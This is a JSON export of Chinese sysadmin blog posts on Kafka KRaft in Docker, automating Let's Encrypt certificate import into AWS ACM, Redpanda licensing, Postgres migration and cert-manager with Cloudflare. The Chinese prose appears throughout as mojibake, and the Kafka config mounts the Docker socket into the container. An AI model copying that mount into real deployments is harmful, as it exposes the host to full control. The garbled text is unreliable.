Kafka. 12 KAFKA_PROCESS_ROLES: controller,broker # Kafka acts as both broker and controller. 13 KAFKA_NODE_ID: 1 # A unique ID for this Kafka instance. 14 KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093 # Defines the controller voters. 15 KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093 16 KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT 17 KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT 18 KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER 19 KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092 20 KAFKA_LOG_DIRS: /var/lib/kafka/data # Where Kafka stores its logs. 21 KAFKA_AUTO_CREATE_TOPICS_ENABLE: true # Kafka will automatically create topics if needed. 22 KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1 # Since weâ€™re running one broker, one replica is enough. 23 KAFKA_LOG_RETENTION_HOURS: 168 # Keep logs for 7 days. 24 KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: 0 # No delay for consumer rebalancing. 25 CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk # A unique ID for the Kafka cluster. 26 volumes: 27 - /var/run/docker.sock:/var/run/docker.sock 28 - ./data:/var/lib/kafka/data # Store Kafka logs on your local machine. æ³¨æ„ä»¥ä¸Šçš„æ–‡ä»¶ï¼Œæš´éœ²äº†2ä¸ªç«¯å£ï¼Œ9092å’Œ9093ï¼Œ9092ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œ9093ç”¨äºé›†ç¾¤é€šè®¯ï¼›KAFKA_KRAFT_MODE: trueç”¨kraftä¸ç”¨zk. ClUSTER_IDå¯ä»¥æ¢ä¸ªä¸åŒçš„ã€‚\nå¦å¤–é…ç½®æœ‰ä¸¤ä¸ª10.8.1.119åœ°å€ï¼Œè¿™æ˜¯Dockerå®¿ä¸»æœºçš„ipï¼Œè¿™æ˜¯å¯¹å¤–å¼€æ”¾å¿…é¡»è¦æ”¹çš„ã€‚ ç„¶åæ–‡ä»¶å·ï¼Œdocker-compose.ymlæ–‡ä»¶çš„åŒçº§ç›®å½•æœ‰ä¸ªdataæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹çš„å±ä¸»å¿…é¡»æ˜¯id=1000çš„ç”¨æˆ·ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ çš„ç”¨æˆ·ï¼Œdebian\næ‰€ä»¥è¦è®¾ç½®ä¸€ä¸‹å±ä¸»ï¼š\n1chown -R debian:debian data å¦‚æœå±ä¸»ä¸æ˜¯1000ï¼Œä¼šçˆ†å‡ºä»¥ä¸‹æŠ¥é”™ä¿¡æ¯å¹¶é€€å‡ºï¼š\n1kafka | ===\u0026gt; User 2kafka | uid=1000(appuser) gid=1000(appuser) groups=1000(appuser) 3kafka | ===\u0026gt; Configuring ... 4kafka | ===\u0026gt; Running preflight checks ... 5kafka | ===\u0026gt; Check if /var/lib/kafka/data is writable ... 6kafka | Command [/usr/local/bin/dub path /var/lib/kafka/data writable] FAILED ! 7kafka exited with code 1 ç„¶åå¯åŠ¨å³å¯ï¼š\n1docker-compose up -d éšåæµ‹è¯•ä¸€ä¸‹ï¼š\n1#è¿›å…¥å®¹å™¨bash 2docker exec -it kafka bash 3 4#å»ºç«‹ä¸€ä¸ªtest-topic 5/usr/bin/kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 6 7#å‘ç‚¹æ¶ˆæ¯è¿›å» 8/usr/bin/kafka-console-producer --broker-list localhost:9092 --topic test-topic 9\u0026gt; Hello Kafka! 10\u0026gt; This is a test message. 11 12#å¦å¤–ä¸€ä¸ªå®¢æˆ·ç«¯æ”¶æ¶ˆæ¯ 13/usr/bin/kafka-console-consumer --bootstrap-server localhost:9092 --topic test-topic - 14Hello Kafka! 15This is a test message. 16 17#æŸ¥çœ‹æ‰€æœ‰çš„topics 18/usr/bin/kafka-topics --list --bootstrap-server localhost:9092 ","date":"2025-07-28","img":"","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_docker/","series":null,"tags":null,"title":"ç”¨Dockeréƒ¨ç½²kafkaä¸”ä¸ä¾èµ–zookeeper"},{"categories":null,"content":"äº¤ä»£ä¸€ä¸‹èƒŒæ™¯ï¼š\nå…¬å¸åœ¨AWSä¸Šç”¨çš„æ˜¯EKS+Fargateï¼Œè¿˜æœ‰ä¸€ä¸ªè·³æ¿æœºï¼Œè¯ä¹¦å‘¢å°±ä¸å¤ªæƒ³ç”¨awsæ”¶è´¹çš„äº†ï¼Œå¹²è„†ç”¨å…è´¹çš„è¯ä¹¦å¥½äº†ã€‚\né‚£é—®é¢˜å°±æ¥äº†ï¼ŒLetâ€˜s encryptçš„è¯ä¹¦90å¤©åˆ°æœŸï¼Œå·²ç»æ‰‹åŠ¨æ›´æ–°è¿‡3æ¬¡äº†ï¼Œå®åœ¨å¤ªéº»çƒ¦äº†ï¼Œèƒ½ä¸èƒ½è‡ªåŠ¨ç”³è¯·å¹¶æ›´æ–°åˆ°ACMå‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼ŒåŸç†æ˜¯ï¼šåˆ©ç”¨EC2å¯ä»¥æºå¸¦IAMè§’è‰²çš„åŸç†ï¼Œå°±å¯ä»¥æ— å‡­è¯æ›´æ–°å…è´¹è¯ä¹¦åˆ°AWS Certificate Manageräº†\nåšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é¦–å…ˆå»ACMä¸­æ‹¿åˆ°è¯ä¹¦çš„ARNï¼Œè¦ç¡®ä¿IAMæƒé™ä¸å¤–æ³„ï¼Œé¿å…æ›´æ–°é”™è¯ä¹¦\näºŒã€ç”Ÿæˆä¸€ä¸ªIAMçš„policyï¼Œå‘½åä¸ºAllowUpdateCertificateï¼Œåªå…è®¸æ›´æ–°è¿™ä¸¤ä¸ªç‰¹å®šçš„è¯ä¹¦\nå…·ä½“ç­–ç•¥å†…å®¹å¦‚ä¸‹ï¼š\n1{ 2\t\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 3\t\u0026#34;Statement\u0026#34;: [ 4\t{ 5\t\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 6\t\u0026#34;Action\u0026#34;: [ 7\t\u0026#34;acm:ImportCertificate\u0026#34; 8\t], 9\t\u0026#34;Resource\u0026#34;: [ 10\t\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01\u0026#34;, 11\t\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02\u0026#34; 12\t] 13\t} 14\t] 15} ä¸‰ã€IAMç”Ÿæˆä¸€ä¸ªroleè§’è‰²ï¼Œå‘½åä¸ºEc2UpdateCertificateRoleï¼ŒæŠŠAllowUpdateCertificateç­–ç•¥ç»™é™„ä¸Š\nå››ã€åˆ°EC2çš„å®ä¾‹è¯¦ç»†ä¿¡æ¯ä¸­ï¼Œæ“ä½œ\u0026ndash;\u0026gt;å®‰å…¨\u0026ndash;\u0026gt;ä¿®æ”¹IAMè§’è‰²\né™„ä¸ŠEc2UpdateCertificateRoleè¿™ä¸ªè§’è‰²\näº”ã€åœ¨EC2çš„æœºå™¨ä¸Šï¼Œè£…å¥½AWS CLIï¼Œè¿˜æœ‰lego(ç”³è¯·Let\u0026rsquo;s encryptè¯ä¹¦çš„è½¯ä»¶)\nå…ˆå†™å¥½è·å¾—è¯ä¹¦çš„è„šæœ¬ get_cert.shï¼ŒåŸŸåDNSè§£ææ˜¯æ‰˜ç®¡åˆ°cloudflareçš„ï¼Œæ‰€ä»¥ä¹Ÿç›´æ¥ç”¨API TOKENæ¥å¤„ç†\n1#!/bin/bash 2 3CLOUDFLARE_DNS_API_TOKEN=######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=\u0026#34;/usr/local/bin/update_aws_cert.sh\u0026#34; å‚æ•°--renew-hookå¦‚æœæœ‰æ–°è¯ä¹¦ï¼Œå°±è°ƒç”¨åé¢çš„è„šæœ¬ã€‚å¦‚æœæ²¡æœ‰æ–°è¯ä¹¦ï¼Œå°±æ— æ“ä½œï¼Œé¿å…æ— ç”¨åŠŸã€‚\nç„¶åå†å†™å¥½ update_aws_cert.shï¼Œè¿™å°±æ˜¯ä¸ªåƒå­—æ–‡äº†ï¼Œç”±geminiç”Ÿæˆçš„ï¼š\nç”±äºlegoç”Ÿæˆçš„crtæ˜¯è¯ä¹¦+è¯ä¹¦é“¾ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥è¦æŠŠè¯ä¹¦éƒ¨åˆ†ç»™å•ç‹¬æ‹†å‡ºæ¥\n1#!/bin/bash 2 3cd /usr/local/bin/certs/certificates 4 5#é¦–å…ˆæŠŠè¯ä¹¦å•ç‹¬æ‹†å‡ºæ¥ 6awk \u0026#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}\u0026#39; _.rendoumi.com.crt \u0026gt; _.rendoumi.com.only 7 8# --- é…ç½®éƒ¨åˆ† --- 9# æ‚¨è¦æ›´æ–°çš„ç°æœ‰ ACM è¯ä¹¦çš„ ARN 10# ç¤ºä¾‹ï¼šCERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab\u0026#34; 11CERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111\u0026#34; 12 13# æ–°è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/new_certificate.crtï¼‰ 14# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„ 15CERTIFICATE_BODY_PATH=\u0026#34;_.rendoumi.com.only\u0026#34; 16 17# æ–°ç§é’¥æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/private.keyï¼‰ 18# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„ 19PRIVATE_KEY_PATH=\u0026#34;_.rendoumi.com.key\u0026#34; 20 21# è¯ä¹¦é“¾æ–‡ä»¶çš„è·¯å¾„ï¼ˆå¯é€‰ï¼‰ 22# å¦‚æœæ²¡æœ‰è¯ä¹¦é“¾ï¼Œè¯·å°†æ­¤å˜é‡ç•™ç©ºæˆ–æ³¨é‡Šæ‰ 23# ç¤ºä¾‹ï¼šCERTIFICATE_CHAIN_PATH=\u0026#34;/opt/certs/ca_bundle.crt\u0026#34; 24CERTIFICATE_CHAIN_PATH=\u0026#34;_.rendoumi.com.issuer.crt\u0026#34; # å¦‚æœæ²¡æœ‰é“¾ï¼Œè¯·å°†å…¶ç•™ç©º \u0026#34;\u0026#34; 25 26# ACM è¯ä¹¦æ‰€åœ¨çš„ AWS åŒºåŸŸ 27# è¿™ä¸ªåŒºåŸŸåº”è¯¥ä¸ CERTIFICATE_ARN ä¸­çš„åŒºåŸŸåŒ¹é… 28# ç¤ºä¾‹ï¼šAWS_REGION=\u0026#34;ap-southeast-1\u0026#34; 29AWS_REGION=\u0026#34;ap-southeast-1\u0026#34; 30# --- é…ç½®éƒ¨åˆ†ç»“æŸ --- 31 32echo \u0026#34;--- å¼€å§‹ä½¿ç”¨å®ä¾‹è§’è‰²é‡æ–°å¯¼å…¥ ACM è¯ä¹¦ ---\u0026#34; 33echo \u0026#34;è¯ä¹¦ ARN: ${CERTIFICATE_ARN}\u0026#34; 34echo \u0026#34;åŒºåŸŸ: ${AWS_REGION}\u0026#34; 35 36# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ 37if [ ! -f \u0026#34;${CERTIFICATE_BODY_PATH}\u0026#34; ]; then 38 echo \u0026#34;é”™è¯¯ï¼šè¯ä¹¦æ–‡ä»¶ \u0026#39;${CERTIFICATE_BODY_PATH}\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34; 39 exit 1 40fi 41 42if [ ! -f \u0026#34;${PRIVATE_KEY_PATH}\u0026#34; ]; then 43 echo \u0026#34;é”™è¯¯ï¼šç§é’¥æ–‡ä»¶ \u0026#39;${PRIVATE_KEY_PATH}\u0026#39; ä¸å­˜åœ¨ã€‚\u0026#34; 44 exit 1 45fi 46 47if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ] \u0026amp;\u0026amp; [ ! -f \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then 48 echo \u0026#34;è­¦å‘Šï¼šè¯ä¹¦é“¾æ–‡ä»¶ \u0026#39;${CERTIFICATE_CHAIN_PATH}\u0026#39; å·²æŒ‡å®šä½†ä¸å­˜åœ¨ã€‚å°†ä¸åŒ…å«è¯ä¹¦é“¾è¿›è¡Œå¯¼å…¥ã€‚\u0026#34; 49 CERTIFICATE_CHAIN_PATH=\u0026#34;\u0026#34; # å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºè·¯å¾„ 50fi 51 52# æ„é€  AWS CLI å‘½ä»¤ã€‚AWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹è§’è‰²æä¾›çš„å‡­è¯ã€‚ 53IMPORT_CMD=\u0026#34;aws acm import-certificate \\ 54 --certificate-arn ${CERTIFICATE_ARN} \\ 55 --certificate fileb://${CERTIFICATE_BODY_PATH} \\ 56 --private-key fileb://${PRIVATE_KEY_PATH} \\ 57 --region \\\u0026#34;${AWS_REGION}\\\u0026#34;\u0026#34; 58 59# å¦‚æœæœ‰è¯ä¹¦é“¾ï¼Œåˆ™æ·»åŠ åˆ°å‘½ä»¤ä¸­ 60if [ -n \u0026#34;${CERTIFICATE_CHAIN_PATH}\u0026#34; ]; then 61 IMPORT_CMD=\u0026#34;${IMPORT_CMD} --certificate-chain fileb://${CERTIFICATE_CHAIN_PATH}\u0026#34; 62fi 63 64echo \u0026#34;æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼š\u0026#34; 65echo \u0026#34;$IMPORT_CMD\u0026#34; 66echo \u0026#34;--------------------------\u0026#34; 67 68# æ‰§è¡Œå‘½ä»¤ 69# æ³¨æ„ï¼šè¿™é‡Œæˆ‘ä»¬ä¸æŒ‡å®š --profile æˆ–ä»»ä½•å‡­è¯ï¼ŒAWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹IAMè§’è‰²ã€‚ 70eval $IMPORT_CMD 71 72# æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ 73if [ $? -eq 0 ]; then 74 echo \u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥æˆåŠŸï¼---\u0026#34; 75 echo \u0026#34;ACM è¯ä¹¦ ${CERTIFICATE_ARN} å·²æ›´æ–°ã€‚\u0026#34; 76else 77 echo \u0026#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥å¤±è´¥ï¼---\u0026#34; 78 echo \u0026#34;è¯·æ£€æŸ¥é”™è¯¯æ¶ˆæ¯ï¼Œç¡®ä¿ï¼š\u0026#34; 79 echo \u0026#34;1. EC2 å®ä¾‹å·²æ­£ç¡®é™„åŠ äº†å…·æœ‰ acm:ImportCertificate æƒé™çš„ IAM è§’è‰²ã€‚\u0026#34; 80 echo \u0026#34;2. è¯ä¹¦ã€ç§é’¥å’Œé“¾æ–‡ä»¶è·¯å¾„æ­£ç¡®ä¸”å¯è¯»ã€‚\u0026#34; 81 echo \u0026#34;3. è¯ä¹¦/ç§é’¥/é“¾çš„æ ¼å¼æ­£ç¡®ã€‚\u0026#34; 82fi 83 84echo \u0026#34;--- è„šæœ¬æ‰§è¡Œå®Œæ¯• ---\u0026#34; çœ‹èµ·æ¥çœŸçš„æ˜¯åˆè‡­åˆé•¿ï¼ŒåºŸè¯è¿ç¯‡ã€‚æ³¨æ„ï¼šgemini ç”Ÿæˆçš„ä»£ç æœ‰é—®é¢˜ï¼Œaws acm import-certificate çš„å‚æ•°ä¸­ï¼Œè¯ä¹¦æ–‡ä»¶çš„å‰ç¼€æ˜¯fileb://ï¼Œgeminiç»™çš„æ˜¯file://ï¼Œè°ƒè¯•äº†åŠå¤©ï¼Œæœ€åå»awsçœ‹äº†æ–‡æ¡£æ‰å‘ç°ã€‚\nå¦‚ä¸Šæ“ä½œï¼Œè„šæœ¬æ”¾å…¥åˆ°crontbä¸­ï¼Œæ²¡æœ‰ç”¨åˆ°ä»»ä½•aws access idå’Œsecretï¼Œå°±èƒ½æ­£ç¡®æ›´æ–°è¯ä¹¦ï¼Œå–„è«å¤§ç„‰ã€‚\n","date":"2025-07-25","img":"","permalink":"https://rendoumi.com/posts/20250725-aws_route53_update_certificate/","series":null,"tags":null,"title":"Awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM"},{"categories":null,"content":"ä¸Šå›æˆ‘ä»¬åœ¨ Kafkaçš„æµ‹è¯•æ›¿ä»£å“-Redpanda ä¸­è¯´äº†æ€ä¹ˆæ­å»ºï¼Œç»“æœç”¨äº†ä¸€ä¸ªæœˆï¼Œé—®é¢˜å°±æ¥äº†\nlicenseè¿‡æœŸäº†ï¼Œæ“¦çš„ï¼Œåªå…è®¸ç”¨30å¤©ï¼Œéœ€è¦ç»­è´¹äº†ã€‚\næ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€æ‰“å¼€ç½‘ç«™ï¼Œç”³è¯·30å¤©çš„å…è´¹license\nhttps://cloud.redpanda.com/try-enterprise æ‰“å¼€ç½‘ç«™ï¼Œç„¶åå¡«å…¥å§“åå’Œé‚®ç®±ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªé•¿å­—ç¬¦ä¸²xyzï¼Œæ‹·è´ä¸‹æ¥\näºŒã€å»æœºå™¨ä¸Š\næˆ‘ä»¬æ˜¯ç”¨docker composeå¯åŠ¨çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥å®¹å™¨ï¼Œå¯¼å…¥license\n1docker exec -it redpanda-0 /bin/sh 2 3rpk cluster license set xyz ä¸‰ã€é‡å¯å®¹å™¨\næŒ‰é“ç†ä¸Šä¸€æ­¥å¼„å®Œï¼Œå°±åº”è¯¥å¥½äº†çš„ï¼Œå¯æƒœè¿™äº§å“åšçš„ç¨€çƒ‚ã€‚è¿˜å¿…é¡»é‡å¯å®¹å™¨æ‰èµ·ä½œç”¨\n1docker compose restart å°±okäº†ï¼Œä½†æ˜¯30å¤©å°±æ›´æ–°ä¸€æ¬¡licenseï¼Œè€Œä¸”å¿…é¡»è¦é‡å¯å®¹å™¨ï¼Œè¿™è°å—å¾—äº†å•Šã€‚\nä¸‹å‘¨å°±æŠ½ç©ºè£…ä¸€ä¸ªä¸ä¾èµ–Zookeeperï¼Œç”¨Rraftçš„Kafkaæ¥ç”¨ï¼Œå½»åº•å»æ‰è¿™ä¸ªä¸ä¼¦ä¸ç±»çš„è½¯ä»¶ã€‚\n","date":"2025-07-25","img":"","permalink":"https://rendoumi.com/posts/20250725_redpanda_license/","series":null,"tags":null,"title":"Redpandaåˆ°æœŸåå¦‚ä½•ç»­License"},{"categories":null,"content":"å…¬å¸ç”Ÿäº§ç¯å¢ƒåœ¨AWSä½¿ç”¨äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\næµ‹è¯•ç¯å¢ƒæ˜¯åœ¨å†…ç½‘æ­å»ºäº†ä¸€ä¸ªpostgres 13æ•°æ®åº“ã€‚\né‚£æµ‹è¯•å’Œç”Ÿäº§çš„å®ä¾‹ä¸åŒï¼Œæ•°æ®åº“ä¸åŒï¼Œç”¨æˆ·åä¹Ÿä¸åŒï¼Œéœ€è¦æŠŠæµ‹è¯•ç¯å¢ƒçš„Aåº“çš„schema.publicè¿ç§»åˆ°ç”Ÿäº§Båº“çš„schema.publicã€‚\næ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒPGçš„æƒé™åˆ†ä¸‰å±‚ï¼Œæ•°æ®åº“ã€schemaã€schemaä¸­çš„å¯¹è±¡ã€‚\né‚£ä¹ˆç”¨pg_dumpçš„è¯ï¼Œå¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼Œé‚£ä¼šæŠŠæƒé™ä¹Ÿç»™å¸¦ä¸Šï¼Œé‚£å°±éº»çƒ¦å¤§äº†å»äº†ï¼\næ‰€ä»¥æ­£ç¡®çš„å¯¼å‡ºã€å¯¼å…¥æ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€é¦–å…ˆè¦è§‚å¯Ÿæºåº“ï¼Œçœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆextentionï¼Œåœ¨schema.publicæœ‰ä»€ä¹ˆFunctions\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçœ‹åˆ°uuid_generate\n1# çœ‹çœ‹æœåŠ¡å™¨ç‰ˆæœ¬ 2select version(); 3PostgreSQL 13.14 é‚£å°±å¾ˆå¥‡æ€ªï¼Œextension åªæœ‰ä¸€ä¸ªplpgsqlï¼Œfunctionså´æœ‰ä¸€å †uuid_generate\né‚£åæœ‰å…«ä¹éœ€è¦ç”¨åˆ°extension uuid-oosp\nå…ˆå»ç›®çš„åº“å»ºä¸€ä¸ªå§\n1create extension \u0026#34;uuid-ossp\u0026#34;; äºŒã€dumpæ•°æ®\nè¿™é‡Œè¦æ³¨æ„ï¼Œä¸è¦æŠŠä»»ä½•æƒé™çš„ä¸œè¥¿å¸¦è¿›æ¥\n1pg_dump -h 172.16.8.1 -U postgres -d source --schema=public --no-owner --no-privileges --file=export.sql 2 3# å…¨å¤‡ä»½çš„å‘½ä»¤ 4# export PGPASSWORD=\u0026#34;xxxxxxxx\u0026#34; 5# pg_dump -U bbc -h localhost -p 5432 bbc \u0026gt; dc_system.sql ç„¶åè¦ç¼–è¾‘çœ‹çœ‹è¿™ä¸ªå¯¼å…¥çš„æ–‡ä»¶\nå‘ç°æœ‰create schemaçš„è¯­å¥ï¼Œå¦‚æœç›®çš„æ•°æ®åº“å·²ç»æœ‰äº†ï¼Œé‚£éœ€è¦å»æ‰ã€‚\nå†çœ‹ä¸‹é¢ï¼š\nå»ºç«‹äº†ä¸€ä¸ªFUNCTIONï¼Œå¦‚æœå·²ç»å»ºç«‹äº†extensionï¼Œé‚£ä¹Ÿä¼šæŠ¥é”™ï¼Œä¸è¿‡è¿™2ç§é”™è¯¯æˆ‘ä»¬éƒ½å¯ä»¥ç›´æ¥ä¸ç”¨ç®¡ï¼Œç›´æ¥æ‰§è¡Œè¯•è¯•\nä¸‰ã€å¯¼å…¥ç›®æ ‡åº“\nè·‘ä¸€è·‘ï¼Œçœ‹ä¸€çœ‹ï¼š\n1psql -h 10.8.0.1 -U dest -d dest -f export.sql æŠ¥äº†ä¸å°‘é”™\nä¸ä¸Šé¢ç›¸å¯¹åº”ï¼Œå»ºschema.publicå’ŒFUNCTIONæ—¶çš„é”™ï¼Œåé¢å°±æ²¡æœ‰é”™è¯¯äº†ï¼Œè¿™è¯´æ˜å°±æ­£ç¡®å¯¼å…¥äº†\nå››ã€ä¸€äº›æªæ–½\nç¬¬ä¸‰æ­¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰é—®é¢˜ï¼ŒAnywayï¼Œéƒ½æ— æ³•é¿å…ã€‚\néƒ½éœ€è¦ç¼–è¾‘export.sqlæˆ–è€…å¿½ç•¥é”™è¯¯æ¥é¿å…ã€‚\næµ‹äº†ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠschema.publicç»™å¹²æ‰ï¼Œä¹Ÿæ— æ³•é¿å…è¿™ç§æƒ…å†µï¼\n1#ç”¨adminç”¨æˆ·ç™»å½• target åº“ï¼Œæ”¹å˜schema.publicçš„owner 2ALTER SCHEMA public OWNER TO target_user; 3 4#æ”¹å¥½åç”¨target_userç™»å½• target åº“ 5#è¿™æ—¶å€™å°±å¯ä»¥å¹²æ‰äº†schema.publicäº†ï¼Œç„¶åé‡å»ºï¼Œé‡å»ºåå°±åªæœ‰ target_user å¯¹ schema.public æœ‰æƒé™äº† 6DROP SCHEMA public CASCADE; 7CREATE SCHEMA public AUTHORIZATION target_user; 8 9#å¦‚ä¸Šï¼Œtarget_userå¯¹targetåº“ä¸­çš„schema.publicæ‹¥æœ‰æ‰€æœ‰æƒé™ 10#é‚£å°±å¯ä»¥å¯¼å…¥æ•°æ®äº† 11 12#å¯¼å…¥åéœ€è¦æŠŠownerç»™æ”¹å›å»ï¼Œä¾ç„¶éœ€è¦ç”¨adminç”¨æˆ·ç™»å½• target åº“ï¼Œæ”¹owner 13ALTER SCHEMA public OWNER TO admin; 14 15#ç„¶åèµ‹äºˆPUBLICçš„UCæƒé™ 16GRANT USAGE ON SCHEMA public TO public; 17GRANT CREATE ON SCHEMA public TO public; 18 19#å°±æ¢å¤åˆå§‹çŠ¶æ€çš„æƒé™äº† ä¸Šé¢çš„æ“ä½œæœ€å¥½ç”¨pgAdminæ¥å®Œæˆï¼Œå¦åˆ™å¤ªè‹¦é€¼äº†ã€‚\n","date":"2025-07-23","img":"","permalink":"https://rendoumi.com/posts/20250723-postgres_dump_restore/","series":null,"tags":null,"title":"Postgresä¸åŒå®ä¾‹ã€ä¸åŒç”¨æˆ·ç›´æ¥çš„æ•°æ®å¯¼å‡ºå¯¼å…¥"},{"categories":null,"content":"è¿™ä¸ªåœºæ™¯éå¸¸çš„æœ‰æ„æ€ï¼š\nå…¬å¸å†…éƒ¨æœ‰è‹¥å¹²ä¸ªkubernetesé›†ç¾¤ï¼Œå±äºæµ‹è¯•ç¯å¢ƒï¼Œç ”å‘æ­å»ºäº†ä¸€å¥—SAASçš„ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒéœ€è¦xxx.abc.comçš„åŸŸåæ¥è®¿é—®ï¼ŒåŸŸåè§£æè®°å½•å…¨éƒ½æ˜¯192.168.0.xï¼Œä¾›å†…éƒ¨è®¿é—®ï¼ŒåŸŸåä¼šåŠ¨æ€ç”Ÿæˆï¼Œéœ€è¦è¯ä¹¦ä¹Ÿéšä¹‹ç”Ÿæˆï¼Œä¸”dnsåŸŸåæ‰˜ç®¡åœ¨cloudflareä¸Šã€‚\nåŸºæœ¬ç¯å¢ƒå¦‚ä¸Šï¼Œéº»çƒ¦çš„æ˜¯ cert-manager ä¸å¯èƒ½ç­¾å‘ç§ç½‘çš„è¯ä¹¦ï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œç”¨dnséªŒè¯çš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦äº†ï¼Œå¦‚æœé…ä¸Š external-dnsï¼Œé‚£dnsè§£æä¹Ÿä¸ç”¨åšäº†ï¼›åªè¦å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ç›´æ¥ç”Ÿæˆdnsè§£æè®°å½•å’Œå¯¹åº”çš„httpsè¯ä¹¦ã€‚\nå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é…ç½® cloudflare API token\nç™»å½•cloudflareï¼Œå»ç”ŸæˆAPI Tokenï¼Œè·¯å¾„æ˜¯ï¼šUser Profile \u0026gt; API Tokens \u0026gt; API Tokens.\nPermissionsï¼š\nZone - DNS - Edit Zone Resources:\nInclude - All Zones cert-managerçš„å®˜æ–¹æ–‡æ¡£å±…ç„¶æ˜¯é”™çš„ï¼Œhttps://cert-manager.io/docs/configuration/acme/dns01/cloudflare/\næ¨èçš„ Zone - Zone - Read æ˜¯åŠ ä¸ä¸Šçš„ï¼Œæœ‰Editå°±è¶³å¤Ÿäº†\nç„¶åè·å¾—Tokençš„å­—ç¬¦ä¸²xxxxxx\näºŒã€å®‰è£…cert-manager\nè¿™ä¸ªç®€å•ï¼Œç›´æ¥ç”¨helmå®‰è£…\nç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025.07.09ï¼Œcert-manager æ˜¯ v1.18.2ï¼Œæ‰€ä»¥ç”¨æ–°å‘½ä»¤æ‰§è¡Œå®‰è£…\n1helm repo add jetstack https://charts.jetstack.io 2helm repo update 3 4#è€ç‰ˆæœ¬æ¯”å¦‚1.0 5helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set installCRDs=true 6 7#æ–°ç‰ˆæœ¬v1.18.2 8helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled=true ä¸‰ã€å‡†å¤‡ç­¾å‘æœºæ„Issuer\nä¸‹é¢è¦ç‰¹åˆ«æ³¨æ„ï¼Œsecretå¿…é¡»åœ¨namespaceï¼šcert-managerä¸­ï¼Œå› ä¸ºä¸Šä¸€æ­¥æˆ‘ä»¬åˆ›å»ºäº†ns cert-managerï¼Œpodä¹Ÿåœ¨è¿™ä¸ªnsä¸­ï¼Œç­¾å‘çš„è¿‡ç¨‹ä¸­æ˜¯ç”±cert-managerä¸­çš„podå‘èµ·è¯·æ±‚çš„\n1# secret 2--- 3apiVersion: v1 4kind: Secret 5metadata: 6 name: cloudflare-api-token-secret 7 namespace: cert-manager 8type: Opaque 9stringData: 10 api-token: xxxxxxxx 11# Issuer 12--- 